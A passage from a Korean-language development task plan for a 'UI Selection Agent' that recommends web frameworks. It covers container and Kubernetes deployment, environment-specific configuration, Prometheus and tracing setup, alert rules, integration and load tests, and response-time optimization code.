    image: postgres:15-alpine
    container_name: t-developer-postgres
    restart: unless-stopped
    environment:
      - POSTGRES_USER=user
      - POSTGRES_PASSWORD=pass
      - POSTGRES_DB=t_developer
    ports:
      - "5432:5432"
    volumes:
      - postgres-data:/var/lib/postgresql/data
    networks:
      - t-developer-network

networks:
  t-developer-network:
    driver: bridge

volumes:
  redis-data:
  postgres-data:
```

**Kubernetes 배포 매니페스트**:

```yaml
# k8s/ui-selection-agent-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ui-selection-agent
  namespace: t-developer
  labels:
    app: ui-selection-agent
    component: agent
    version: v1
spec:
  replicas: 3
  selector:
    matchLabels:
      app: ui-selection-agent
  template:
    metadata:
      labels:
        app: ui-selection-agent
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "8080"
        prometheus.io/path: "/metrics"
    spec:
      serviceAccountName: ui-selection-agent
      containers:
        - name: ui-selection-agent
          image: t-developer/ui-selection-agent:latest
          imagePullPolicy: Always
          ports:
            - containerPort: 8080
              name: http
            - containerPort: 9090
              name: metrics
          env:
            - name: AGENT_ID
              valueFrom:
                fieldRef:
                  fieldPath: metadata.name
            - name: REDIS_URL
              valueFrom:
                secretKeyRef:
                  name: redis-secret
                  key: url
            - name: DATABASE_URL
              valueFrom:
                secretKeyRef:
                  name: postgres-secret
                  key: url
            - name: LOG_LEVEL
              value: "INFO"
            - name: ENABLE_METRICS
              value: "true"
          resources:
            requests:
              memory: "1Gi"
              cpu: "500m"
            limits:
              memory: "2Gi"
              cpu: "2000m"
          livenessProbe:
            httpGet:
              path: /health
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 10
          readinessProbe:
            httpGet:
              path: /ready
              port: 8080
            initialDelaySeconds: 5
            periodSeconds: 5
          volumeMounts:
            - name: config
              mountPath: /app/config
              readOnly: true
            - name: cache
              mountPath: /app/cache
      volumes:
        - name: config
          configMap:
            name: ui-selection-agent-config
        - name: cache
          emptyDir:
            sizeLimit: 1Gi
```

**검증 기준**:

- [ ] 최적화된 Docker 이미지
- [ ] 멀티 스테이지 빌드
- [ ] 헬스체크 구현
- [ ] Kubernetes 지원

### SubTask 4.19.2: 환경별 설정 관리

**담당자**: 설정 관리 엔지니어  
**예상 소요시간**: 8시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/config/config_manager.py
from typing import Dict, Any, Optional
import os
import yaml
import json
from dataclasses import dataclass
from enum import Enum

class Environment(Enum):
    DEVELOPMENT = "development"
    STAGING = "staging"
    PRODUCTION = "production"
    TEST = "test"

@dataclass
class UIAgentConfig:
    """UI Agent 설정"""
    # 기본 설정
    agent_id: str
    environment: Environment
    version: str

    # 네트워크 설정
    host: str
    port: int

    # 데이터베이스 설정
    database_url: str
    redis_url: str

    # 캐시 설정
    cache_enabled: bool
    cache_ttl: int
    cache_max_size: int

    # 성능 설정
    max_concurrent_requests: int
    request_timeout: int
    batch_size: int

    # 로깅 설정
    log_level: str
    log_format: str

    # 모니터링 설정
    metrics_enabled: bool
    metrics_port: int

    # 프레임워크별 설정
    framework_configs: Dict[str, Any]

class ConfigManager:
    """환경별 설정 관리"""

    def __init__(self):
        self.configs = {}
        self.current_env = None
        self.config_sources = [
            'env_vars',
            'config_file',
            'remote_config',
            'defaults'
        ]

    def load_config(
        self,
        environment: str = None
    ) -> UIAgentConfig:
        """설정 로드"""

        env = Environment(environment or os.getenv('ENVIRONMENT', 'development'))
        self.current_env = env

        # 기본 설정 로드
        config_dict = self._load_defaults()

        # 환경별 설정 파일 로드
        env_config = self._load_env_config(env)
        config_dict.update(env_config)

        # 환경 변수 오버라이드
        env_overrides = self._load_env_vars()
        config_dict.update(env_overrides)

        # 원격 설정 로드 (있는 경우)
        if config_dict.get('remote_config_enabled'):
            remote_config = self._load_remote_config(env)
            config_dict.update(remote_config)

        # 설정 검증
        self._validate_config(config_dict)

        # 설정 객체 생성
        return self._create_config_object(config_dict)

    def _load_defaults(self) -> Dict[str, Any]:
        """기본 설정 로드"""

        return {
            'agent_id': 'ui-selection-agent-default',
            'version': '1.0.0',
            'host': '0.0.0.0',
            'port': 8080,
            'cache_enabled': True,
            'cache_ttl': 3600,
            'cache_max_size': 1000,
            'max_concurrent_requests': 50,
            'request_timeout': 30000,
            'batch_size': 10,
            'log_level': 'INFO',
            'log_format': 'json',
            'metrics_enabled': True,
            'metrics_port': 9090,
            'framework_configs': self._load_framework_defaults()
        }

    def _load_env_config(
        self,
        environment: Environment
    ) -> Dict[str, Any]:
        """환경별 설정 파일 로드"""

        config_path = f"config/{environment.value}.yaml"

        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                return yaml.safe_load(f)

        return {}

    def _load_env_vars(self) -> Dict[str, Any]:
        """환경 변수에서 설정 로드"""

        config = {}

        # 환경 변수 매핑
        env_mappings = {
            'UI_AGENT_ID': 'agent_id',
            'UI_AGENT_HOST': 'host',
            'UI_AGENT_PORT': ('port', int),
            'DATABASE_URL': 'database_url',
            'REDIS_URL': 'redis_url',
            'CACHE_ENABLED': ('cache_enabled', lambda x: x.lower() == 'true'),
            'CACHE_TTL': ('cache_ttl', int),
            'MAX_CONCURRENT_REQUESTS': ('max_concurrent_requests', int),
            'LOG_LEVEL': 'log_level',
            'METRICS_ENABLED': ('metrics_enabled', lambda x: x.lower() == 'true')
        }

        for env_var, mapping in env_mappings.items():
            value = os.getenv(env_var)
            if value is not None:
                if isinstance(mapping, tuple):
                    key, converter = mapping
                    config[key] = converter(value)
                else:
                    config[mapping] = value

        return config
```

**환경별 설정 파일**:

```yaml
# config/development.yaml
environment: development
database_url: postgresql://dev_user:dev_pass@localhost:5432/t_developer_dev
redis_url: redis://localhost:6379/0

cache:
  enabled: true
  ttl: 1800 # 30 minutes
  max_size: 500

performance:
  max_concurrent_requests: 20
  request_timeout: 60000 # 60 seconds
  batch_size: 5

logging:
  level: DEBUG
  format: text
  outputs:
    - console
    - file: logs/ui-agent-dev.log

monitoring:
  enabled: true
  port: 9090
  endpoints:
    - /metrics
    - /health
    - /debug

framework_configs:
  react:
    default_version: "18.2.0"
    typescript_enabled: true
  vue:
    default_version: "3.3.0"
    composition_api: true
  angular:
    default_version: "16.0.0"
    ivy_enabled: true

---
# config/production.yaml
environment: production
database_url: ${DATABASE_URL} # From environment variable
redis_url: ${REDIS_URL}

cache:
  enabled: true
  ttl: 7200 # 2 hours
  max_size: 10000

performance:
  max_concurrent_requests: 100
  request_timeout: 30000 # 30 seconds
  batch_size: 20

logging:
  level: INFO
  format: json
  outputs:
    - cloudwatch
    - s3: s3://t-developer-logs/ui-agent/

monitoring:
  enabled: true
  port: 9090
  endpoints:
    - /metrics
    - /health

  datadog:
    enabled: true
    api_key: ${DATADOG_API_KEY}

  prometheus:
    enabled: true
    pushgateway: http://prometheus-pushgateway:9091

framework_configs:
  react:
    cdn_enabled: true
    cdn_url: https://cdn.t-developer.ai/frameworks/react/
  vue:
    cdn_enabled: true
    cdn_url: https://cdn.t-developer.ai/frameworks/vue/
```

**동적 설정 업데이트**:

```python
class DynamicConfigManager:
    """동적 설정 관리"""

    def __init__(self, config_manager: ConfigManager):
        self.config_manager = config_manager
        self.config_watchers = {}
        self.remote_config_client = None

    async def initialize(self):
        """동적 설정 시스템 초기화"""

        # 원격 설정 클라이언트 초기화
        if self.config_manager.current_config.remote_config_enabled:
            self.remote_config_client = await self._init_remote_client()

        # 설정 감시자 시작
        await self._start_config_watchers()

    async def _init_remote_client(self):
        """원격 설정 클라이언트 초기화"""

        from .remote_config_client import RemoteConfigClient

        return RemoteConfigClient(
            endpoint=os.getenv('CONFIG_SERVICE_URL'),
            api_key=os.getenv('CONFIG_API_KEY')
        )

    async def _start_config_watchers(self):
        """설정 감시자 시작"""

        # 파일 감시자
        file_watcher = FileConfigWatcher(
            config_path='config/',
            callback=self._on_config_change
        )
        self.config_watchers['file'] = file_watcher

        # 원격 설정 감시자
        if self.remote_config_client:
            remote_watcher = RemoteConfigWatcher(
                client=self.remote_config_client,
                callback=self._on_config_change,
                poll_interval=60  # 60초마다 확인
            )
            self.config_watchers['remote'] = remote_watcher

        # 모든 감시자 시작
        for watcher in self.config_watchers.values():
            await watcher.start()

    async def _on_config_change(
        self,
        change_type: str,
        new_config: Dict[str, Any]
    ):
        """설정 변경 처리"""

        print(f"Configuration change detected: {change_type}")

        # 설정 검증
        if self._validate_config_change(new_config):
            # 설정 업데이트
            await self._apply_config_change(new_config)

            # 변경 이벤트 발생
            await self._emit_config_change_event(change_type, new_config)
        else:
            print("Invalid configuration change, ignoring")
```

**검증 기준**:

- [ ] 환경별 설정 분리
- [ ] 설정 오버라이드 체계
- [ ] 동적 설정 업데이트
- [ ] 설정 검증 메커니즘

### SubTask 4.19.3: 모니터링 및 로깅 설정

**담당자**: 모니터링 엔지니어  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/monitoring/monitoring_setup.py
from typing import Dict, Any, Optional
import prometheus_client
from prometheus_client import Counter, Histogram, Gauge, Summary
import logging
import structlog
from opentelemetry import trace, metrics
from opentelemetry.exporter.prometheus import PrometheusMetricReader
from opentelemetry.sdk.metrics import MeterProvider
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.exporter.jaeger import JaegerExporter

class UIAgentMonitoring:
    """UI Agent 모니터링 설정"""

    def __init__(self):
        self.metrics = {}
        self.logger = None
        self.tracer = None

    def initialize_monitoring(self, config: UIAgentConfig):
        """모니터링 시스템 초기화"""

        # 메트릭 초기화
        self._initialize_metrics()

        # 로깅 초기화
        self._initialize_logging(config)

        # 트레이싱 초기화
        self._initialize_tracing(config)

        # 헬스체크 엔드포인트
        self._setup_health_endpoints()

    def _initialize_metrics(self):
        """Prometheus 메트릭 초기화"""

        # 요청 카운터
        self.metrics['request_count'] = Counter(
            'ui_agent_requests_total',
            'Total number of requests',
            ['method', 'endpoint', 'status']
        )

        # 응답 시간 히스토그램
        self.metrics['response_time'] = Histogram(
            'ui_agent_response_time_seconds',
            'Response time in seconds',
            ['method', 'endpoint'],
            buckets=(0.005, 0.01, 0.025, 0.05, 0.1, 0.25, 0.5, 1.0, 2.5, 5.0)
        )

        # 프레임워크 선택 메트릭
        self.metrics['framework_selections'] = Counter(
            'ui_agent_framework_selections_total',
            'Total framework selections',
            ['framework', 'project_type']
        )

        # 캐시 메트릭
        self.metrics['cache_hits'] = Counter(
            'ui_agent_cache_hits_total',
            'Total cache hits'
        )

        self.metrics['cache_misses'] = Counter(
            'ui_agent_cache_misses_total',
            'Total cache misses'
        )

        # 활성 요청 게이지
        self.metrics['active_requests'] = Gauge(
            'ui_agent_active_requests',
            'Number of active requests'
        )

        # 에러 카운터
        self.metrics['errors'] = Counter(
            'ui_agent_errors_total',
            'Total errors',
            ['error_type', 'severity']
        )

        # 외부 API 호출 메트릭
        self.metrics['external_api_calls'] = Summary(
            'ui_agent_external_api_duration_seconds',
            'External API call duration',
            ['api_name', 'endpoint']
        )

    def _initialize_logging(self, config: UIAgentConfig):
        """구조화된 로깅 초기화"""

        # Structlog 설정
        structlog.configure(
            processors=[
                structlog.stdlib.filter_by_level,
                structlog.stdlib.add_logger_name,
                structlog.stdlib.add_log_level,
                structlog.stdlib.PositionalArgumentsFormatter(),
                structlog.processors.TimeStamper(fmt="iso"),
                structlog.processors.StackInfoRenderer(),
                structlog.processors.format_exc_info,
                structlog.processors.UnicodeDecoder(),
                structlog.processors.JSONRenderer()
            ],
            context_class=dict,
            logger_factory=structlog.stdlib.LoggerFactory(),
            cache_logger_on_first_use=True,
        )

        self.logger = structlog.get_logger(
            "ui_selection_agent",
            agent_id=config.agent_id,
            environment=config.environment.value
        )

    def _initialize_tracing(self, config: UIAgentConfig):
        """분산 트레이싱 초기화"""

        # Jaeger exporter 설정
        jaeger_exporter = JaegerExporter(
            agent_host_name=config.jaeger_host or "localhost",
            agent_port=config.jaeger_port or 6831,
        )

        # Tracer provider 설정
        provider = TracerProvider()
        provider.add_span_processor(
            BatchSpanProcessor(jaeger_exporter)
        )

        trace.set_tracer_provider(provider)
        self.tracer = trace.get_tracer(__name__)
```

**커스텀 메트릭 수집**:

```python
class UIAgentMetricsCollector:
    """UI Agent 전용 메트릭 수집"""

    def __init__(self, monitoring: UIAgentMonitoring):
        self.monitoring = monitoring
        self.custom_metrics = {}

    def initialize_custom_metrics(self):
        """커스텀 메트릭 초기화"""

        # 프레임워크별 성능 메트릭
        self.custom_metrics['framework_performance'] = Histogram(
            'ui_agent_framework_performance_score',
            'Framework performance scores',
            ['framework', 'metric_type'],
            buckets=(0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.0)
        )

        # 의사결정 신뢰도
        self.custom_metrics['decision_confidence'] = Histogram(
            'ui_agent_decision_confidence',
            'Decision confidence scores',
            ['decision_type'],
            buckets=(0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.0)
        )

        # 요구사항 복잡도
        self.custom_metrics['requirement_complexity'] = Gauge(
            'ui_agent_requirement_complexity',
            'Requirement complexity score'
        )

        # 프레임워크 매칭률
        self.custom_metrics['framework_match_rate'] = Summary(
            'ui_agent_framework_match_rate',
            'Framework matching rate',
            ['framework', 'requirement_type']
        )

    def record_framework_selection(
        self,
        framework: str,
        confidence: float,
        factors: Dict[str, float]
    ):
        """프레임워크 선택 메트릭 기록"""

        # 기본 선택 카운터
        self.monitoring.metrics['framework_selections'].labels(
            framework=framework,
            project_type=factors.get('project_type', 'unknown')
        ).inc()

        # 신뢰도 기록
        self.custom_metrics['decision_confidence'].labels(
            decision_type='framework_selection'
        ).observe(confidence)

        # 성능 점수 기록
        for metric_type, score in factors.items():
            if isinstance(score, (int, float)):
                self.custom_metrics['framework_performance'].labels(
                    framework=framework,
                    metric_type=metric_type
                ).observe(score)
```

**로그 집계 및 분석**:

```python
class LogAggregator:
    """로그 집계 및 분석"""

    def __init__(self):
        self.log_processors = []
        self.log_sinks = []

    def add_processor(self, processor):
        """로그 프로세서 추가"""
        self.log_processors.append(processor)

    def add_sink(self, sink):
        """로그 싱크 추가"""
        self.log_sinks.append(sink)

    async def process_log(self, log_entry: Dict[str, Any]):
        """로그 처리"""

        # 프로세서 체인 실행
        processed_log = log_entry
        for processor in self.log_processors:
            processed_log = await processor.process(processed_log)

        # 싱크로 전송
        for sink in self.log_sinks:
            await sink.send(processed_log)

class ErrorLogAnalyzer:
    """에러 로그 분석"""

    def __init__(self):
        self.error_patterns = {}
        self.error_threshold = 10

    async def analyze_error_log(
        self,
        log_entry: Dict[str, Any]
    ) -> Optional[Dict[str, Any]]:
        """에러 로그 분석"""

        if log_entry.get('level') not in ['ERROR', 'CRITICAL']:
            return None

        error_type = log_entry.get('error_type', 'unknown')

        # 에러 패턴 추적
        if error_type not in self.error_patterns:
            self.error_patterns[error_type] = {
                'count': 0,
                'first_seen': datetime.utcnow(),
                'last_seen': None,
                'samples': []
            }

        pattern = self.error_patterns[error_type]
        pattern['count'] += 1
        pattern['last_seen'] = datetime.utcnow()

        if len(pattern['samples']) < 5:
            pattern['samples'].append(log_entry)

        # 임계값 초과 시 알림
        if pattern['count'] > self.error_threshold:
            return {
                'alert_type': 'error_threshold_exceeded',
                'error_type': error_type,
                'count': pattern['count'],
                'time_window': (pattern['last_seen'] - pattern['first_seen']).total_seconds()
            }

        return None
```

**대시보드 설정**:

```yaml
# monitoring/dashboards/ui-agent-dashboard.json
{
  "dashboard":
    {
      "title": "UI Selection Agent Dashboard",
      "panels":
        [
          {
            "title": "Request Rate",
            "type": "graph",
            "targets":
              [
                {
                  "expr": "rate(ui_agent_requests_total[5m])",
                  "legendFormat": "{{method}} {{endpoint}}",
                },
              ],
          },
          {
            "title": "Response Time (p95)",
            "type": "graph",
            "targets":
              [
                {
                  "expr": "histogram_quantile(0.95, rate(ui_agent_response_time_seconds_bucket[5m]))",
                  "legendFormat": "p95 Response Time",
                },
              ],
          },
          {
            "title": "Framework Selections",
            "type": "piechart",
            "targets":
              [
                {
                  "expr": "sum by (framework) (increase(ui_agent_framework_selections_total[1h]))",
                  "legendFormat": "{{framework}}",
                },
              ],
          },
          {
            "title": "Cache Hit Rate",
            "type": "stat",
            "targets":
              [
                {
                  "expr": "sum(rate(ui_agent_cache_hits_total[5m])) / (sum(rate(ui_agent_cache_hits_total[5m])) + sum(rate(ui_agent_cache_misses_total[5m])))",
                  "legendFormat": "Cache Hit Rate",
                },
              ],
          },
          {
            "title": "Error Rate",
            "type": "graph",
            "targets":
              [
                {
                  "expr": "sum by (error_type) (rate(ui_agent_errors_total[5m]))",
                  "legendFormat": "{{error_type}}",
                },
              ],
          },
        ],
    },
}
```

**알림 규칙**:

```yaml
# monitoring/alerts/ui-agent-alerts.yaml
groups:
  - name: ui_agent_alerts
    interval: 30s
    rules:
      - alert: HighErrorRate
        expr: sum(rate(ui_agent_errors_total[5m])) > 0.1
        for: 5m
        labels:
          severity: warning
          component: ui-selection-agent
        annotations:
          summary: "High error rate detected"
          description: "Error rate is {{ $value }} errors per second"

      - alert: HighResponseTime
        expr: histogram_quantile(0.95, rate(ui_agent_response_time_seconds_bucket[5m])) > 2
        for: 5m
        labels:
          severity: warning
          component: ui-selection-agent
        annotations:
          summary: "High response time detected"
          description: "95th percentile response time is {{ $value }} seconds"

      - alert: LowCacheHitRate
        expr: |
          sum(rate(ui_agent_cache_hits_total[5m])) / 
          (sum(rate(ui_agent_cache_hits_total[5m])) + sum(rate(ui_agent_cache_misses_total[5m]))) < 0.5
        for: 10m
        labels:
          severity: info
          component: ui-selection-agent
        annotations:
          summary: "Low cache hit rate"
          description: "Cache hit rate is {{ $value }}"
```

**검증 기준**:

- [ ] Prometheus 메트릭 수집
- [ ] 구조화된 로깅 구현
- [ ] 분산 트레이싱 설정
- [ ] 실시간 대시보드 구성

### SubTask 4.19.4: UI Agent 통합 테스트

**담당자**: QA 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/tests/agents/ui_selection/integration/test_ui_agent_integration.py
import pytest
import asyncio
from unittest.mock import Mock, patch
import aiohttp
from datetime import datetime

class TestUIAgentIntegration:
    """UI Agent 통합 테스트"""

    @pytest.fixture
    async def ui_agent_client(self):
        """UI Agent 클라이언트 픽스처"""
        from agents.implementations.ui_selection.client import UIAgentClient

        client = UIAgentClient(
            base_url="http://localhost:8080",
            timeout=30
        )
        yield client
        await client.close()

    @pytest.fixture
    async def mock_dependencies(self):
        """의존성 모킹"""
        with patch('agents.implementations.ui_selection.nl_input_client') as nl_mock, \
             patch('agents.implementations.ui_selection.parser_client') as parser_mock, \
             patch('agents.implementations.ui_selection.redis_client') as redis_mock:

            # NL Input Agent 모킹
            nl_mock.analyze.return_value = {
                'intent': 'create_web_app',
                'requirements': ['responsive', 'real-time'],
                'confidence': 0.9
            }

            # Parser Agent 모킹
            parser_mock.parse.return_value = {
                'requirements': [
                    {'type': 'functional', 'description': 'Real-time updates'},
                    {'type': 'non-functional', 'description': 'Mobile responsive'}
                ],
                'constraints': {'budget': 'medium', 'timeline': '3 months'}
            }

            yield {
                'nl_input': nl_mock,
                'parser': parser_mock,
                'redis': redis_mock
            }

    @pytest.mark.asyncio
    async def test_end_to_end_framework_selection(
        self,
        ui_agent_client,
        mock_dependencies
    ):
        """종단간 프레임워크 선택 테스트"""

        # 테스트 요청
        request = {
            'project_description': 'I want to build a real-time collaboration tool',
            'requirements': [
                'Real-time updates',
                'Mobile responsive',
                'Team collaboration features'
            ],
            'constraints': {
                'team_size': 5,
                'timeline': '3 months',
                'budget': 'medium'
            }
        }

        # API 호출
        response = await ui_agent_client.select_framework(request)

        # 응답 검증
        assert response['status'] == 'success'
        assert 'recommendation' in response['data']

        recommendation = response['data']['recommendation']
        assert recommendation['primary']['framework'] in ['react', 'vue', 'angular']
        assert recommendation['primary']['confidence_score'] >= 0.5
        assert len(recommendation['alternatives']) >= 2

        # 메타데이터 검증
        assert 'analysis_time' in response['metadata']
        assert response['metadata']['analysis_time'] < 5000  # 5초 이내

    @pytest.mark.asyncio
    async def test_concurrent_requests(
        self,
        ui_agent_client,
        mock_dependencies
    ):
        """동시 요청 처리 테스트"""

        # 10개의 동시 요청 생성
        requests = [
            {
                'project_description': f'Project {i}',
                'requirements': ['requirement1', 'requirement2'],
                'constraints': {}
            }
            for i in range(10)
        ]

        # 동시 실행
        tasks = [
            ui_agent_client.select_framework(req)
            for req in requests
        ]

        responses = await asyncio.gather(*tasks)

        # 모든 응답 검증
        assert len(responses) == 10
        for response in responses:
            assert response['status'] == 'success'

    @pytest.mark.asyncio
    async def test_cache_functionality(
        self,
        ui_agent_client,
        mock_dependencies
    ):
        """캐시 기능 테스트"""

        request = {
            'project_description': 'E-commerce platform',
            'requirements': ['shopping cart', 'payment integration'],
            'constraints': {}
        }

        # 첫 번째 요청 (캐시 미스)
        start_time = datetime.utcnow()
        response1 = await ui_agent_client.select_framework(request)
        first_duration = (datetime.utcnow() - start_time).total_seconds()

        # 두 번째 요청 (캐시 히트)
        start_time = datetime.utcnow()
        response2 = await ui_agent_client.select_framework(request)
        second_duration = (datetime.utcnow() - start_time).total_seconds()

        # 캐시 히트가 더 빨라야 함
        assert second_duration < first_duration * 0.5

        # 결과는 동일해야 함
        assert response1['data'] == response2['data']

    @pytest.mark.asyncio
    async def test_error_handling_and_recovery(
        self,
        ui_agent_client,
        mock_dependencies
    ):
        """에러 처리 및 복구 테스트"""

        # Parser Agent 에러 시뮬레이션
        mock_dependencies['parser'].parse.side_effect = ConnectionError("Parser unavailable")

        request = {
            'project_description': 'Mobile app',
            'requirements': ['offline support'],
            'constraints': {}
        }

        # 에러 발생 시에도 폴백 응답을 받아야 함
        response = await ui_agent_client.select_framework(request)

        assert response['status'] in ['success', 'fallback']
        assert 'recommendation' in response['data']

        # 폴백 표시 확인
        if response['status'] == 'fallback':
            assert 'fallback_reason' in response['data']['recommendation']
```

**성능 테스트**:

```python
# backend/tests/agents/ui_selection/performance/test_performance.py
import pytest
import aiohttp
import asyncio
from locust import HttpUser, task, between
import statistics

class UIAgentPerformanceTest:
    """UI Agent 성능 테스트"""

    @pytest.mark.performance
    async def test_response_time_under_load(self):
        """부하 상태에서의 응답 시간 테스트"""

        async def make_request():
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    'http://localhost:8080/api/v1/select-framework',
                    json={
                        'project_description': 'Test project',
                        'requirements': ['fast', 'scalable']
                    }
                ) as response:
                    return await response.json(), response.elapsed.total_seconds()

        # 100개 동시 요청
        tasks = [make_request() for _ in range(100)]
        results = await asyncio.gather(*tasks)

        response_times = [r[1] for r in results]

        # 성능 메트릭 계산
        metrics = {
            'mean': statistics.mean(response_times),
            'median': statistics.median(response_times),
            'p95': statistics.quantiles(response_times, n=20)[18],  # 95th percentile
            'p99': statistics.quantiles(response_times, n=100)[98],  # 99th percentile
            'max': max(response_times)
        }

        # 성능 기준 검증
        assert metrics['median'] < 1.0  # 중간값 1초 미만
        assert metrics['p95'] < 2.0     # 95% 요청이 2초 미만
        assert metrics['p99'] < 5.0     # 99% 요청이 5초 미만

    @pytest.mark.performance
    async def test_memory_usage(self):
        """메모리 사용량 테스트"""

        import psutil
        import os

        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB

        # 1000개 요청 처리
        for _ in range(1000):
            async with aiohttp.ClientSession() as session:
                await session.post(
                    'http://localhost:8080/api/v1/select-framework',
                    json={'project_description': 'Test'}
                )

        final_memory = process.memory_info().rss / 1024 / 1024  # MB
        memory_increase = final_memory - initial_memory

        # 메모리 누수 검증
        assert memory_increase < 100  # 100MB 미만 증가
```

**통합 시나리오 테스트**:

```python
class IntegrationScenarioTests:
    """통합 시나리오 테스트"""

    @pytest.mark.integration
    async def test_multi_agent_workflow(self):
        """다중 에이전트 워크플로우 테스트"""

        # 1. NL Input Agent로 자연어 처리
        nl_response = await self.nl_client.process({
            'input': 'I need a modern web app with real-time features'
        })

        # 2. Parser Agent로 요구사항 파싱
        parser_response = await self.parser_client.parse({
            'nl_output': nl_response,
            'context': {'user_id': 'test_user'}
        })

        # 3. UI Selection Agent로 프레임워크 선택
        ui_response = await self.ui_client.select_framework({
            'parsed_requirements': parser_response['requirements'],
            'constraints': parser_response['constraints']
        })

        # 4. Component Decision Agent로 전달
        component_response = await self.component_client.decide({
            'framework': ui_response['recommendation']['primary']['framework'],
            'requirements': parser_response['requirements']
        })

        # 전체 워크플로우 검증
        assert nl_response['status'] == 'success'
        assert parser_response['status'] == 'success'
        assert ui_response['status'] == 'success'
        assert component_response['status'] == 'success'

        # 데이터 일관성 검증
        assert ui_response['recommendation']['primary']['framework'] in [
            'react', 'vue', 'angular', 'svelte'
        ]

    @pytest.mark.integration
    async def test_failure_recovery_scenario(self):
        """장애 복구 시나리오 테스트"""

        # Redis 연결 끊기
        await self.redis_client.disconnect()

        # 요청은 여전히 처리되어야 함 (폴백 모드)
        response = await self.ui_client.select_framework({
            'project_description': 'Test project',
            'requirements': []
        })

        assert response['status'] in ['success', 'fallback']

        # Redis 재연결
        await self.redis_client.connect()

        # 정상 동작 확인
        response2 = await self.ui_client.select_framework({
            'project_description': 'Another project',
            'requirements': []
        })

        assert response2['status'] == 'success'
```

**검증 기준**:

- [ ] 종단간 통합 테스트
- [ ] 성능 벤치마크 달성
- [ ] 장애 복구 시나리오
- [ ] 다중 에이전트 협업 검증

## Task 4.20: UI Agent 성능 최적화

### SubTask 4.20.1: 응답 시간 최적화

**담당자**: 성능 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/optimization/response_optimization.py
from typing import Dict, List, Any, Optional
import asyncio
from functools import lru_cache
import aioredis
from concurrent.futures import ThreadPoolExecutor
import numpy as np

class ResponseTimeOptimizer:
    """응답 시간 최적화"""

    def __init__(self):
        self.thread_pool = ThreadPoolExecutor(max_workers=4)
        self.preprocessing_cache = {}
        self.decision_cache = {}

    async def optimize_framework_selection(
        self,
        requirements: Dict[str, Any]
    ) -> Dict[str, Any]:
        """프레임워크 선택 프로세스 최적화"""

        # 1. 병렬 처리 가능한 작업 식별
        parallel_tasks = [
            self._preprocess_requirements(requirements),
            self._load_framework_data(),
            self._fetch_benchmarks(),
            self._check_cache(requirements)
        ]

        # 2. 병렬 실행
        results = await asyncio.gather(*parallel_tasks)

        preprocessed_reqs, framework_data, benchmarks, cached_result = results

        # 3. 캐시 히트인 경우 즉시 반환
        if cached_result:
            return cached_result

        # 4. 빠른 경로 평가 (간단한 경우)
        if self._is_simple_case(preprocessed_reqs):
            return await self._fast_path_selection(
                preprocessed_reqs,
                framework_data
            )

        # 5. 정상 경로 (최적화됨)
        return await self._optimized_selection(
            preprocessed_reqs,
            framework_data,
            benchmarks
        )

    async def _fast_path_selection(
        self,
        requirements: Dict[str, Any],
        framework_data: Dict[str, Any]
    ) -> Dict[str, Any]:
        """간단한 경우를 위한 빠른 경로"""

        # 사전 정의된 패턴 매칭
        patterns = {
            'simple_web': {
                'keywords': ['website', 'static', 'simple'],
                'recommendation': 'vue',
                'confidence': 0.8
            },
            'enterprise': {
                'keywords': ['enterprise', 'large-scale', 'complex'],
                'recommendation': 'angular',
                'confidence': 0.85
            },
            'mobile_first': {
                'keywords': ['mobile', 'app', 'native'],
                'recommendation': 'react-native',
                'confidence': 0.9
            }
        }

        req_text = ' '.join(str(v) for v in requirements.values()).lower()

        for pattern_name, pattern in patterns.items():
            if any(keyword in req_text for keyword in pattern['keywords']):
                return {
                    'recommendation': {
                        'primary': {
                            'framework': pattern['recommendation'],
                            'confidence_score': pattern['confidence'],
                            'reasoning': f'Matched {pattern_name} pattern'
                        },
                        'alternatives': self._get_quick_alternatives(
                            pattern['recommendation']
                        )
                    },
                    'fast_path': True
                }

        return None
```

**비동기 최적화**:

```python
class AsyncOptimizer:
    """비동기 처리 최적화"""

    def __init__(self):
        self.semaphore = asyncio.Semaphore(10)  # 동시 실행 제한
        self.batch_processor = BatchProcessor()

    async def process_requirements_batch(
        self,
        requirements_list: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        """요구사항 배치 처리"""

        # 배치 크기 최적화
        optimal_batch_size = self._calculate_optimal_batch_size(
            len(requirements_list)
        )

        batches = [
            requirements_list[i:i + optimal_batch_size]
            for i in range(0, len(requirements_list), optimal_batch_size)
        ]

        results = []

        for batch in batches:
            batch_results = await self._process_batch(batch)
            results.extend(batch_results)

        return results

    async def _process_batch(
        self,
        batch: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        """배치 처리"""

        async with self.semaphore:
            # 공통 데이터 한 번만 로드
            common_data = await self._load_common_data()

            # 병렬 처리
            tasks = [
                self._process_single_requirement(req, common_data)
                for req in batch
            ]

            return await asyncio.gather(*tasks)

    def _calculate_optimal_batch_size(self, total_size: int) -> int:
        """최적 배치 크기 계산"""

        if total_size < 10:
            return total_size
        elif total_size < 50:
            return 10
        elif total_size < 200:
            return 25
        else:
            return 50
```

**CPU 집약적 작업 최적화**:

```python
class ComputeOptimizer:
    """계산 집약적 작업 최적화"""

    def __init__(self):
        self.vectorizer = None
        self.similarity_cache = {}

    @lru_cache(maxsize=1000)
    def calculate_similarity_cached(
        self,
        req_hash: str,
        framework: str
    ) -> float:
        """캐시된 유사도 계산"""

        return self._calculate_similarity(req_hash, framework)

    def optimize_scoring(
        self,
        requirements: List[str],
        frameworks: List[str]
    ) -> np.ndarray:
        """점수 계산 최적화"""

        # 벡터화를 통한 일괄 처리
        req_vectors = self._vectorize_requirements(requirements)
        framework_vectors = self._get_framework_vectors(frameworks)

        # NumPy를 사용한 빠른 행렬 연산
        scores = np.dot(req_vectors, framework_vectors.T)

        # 정규화
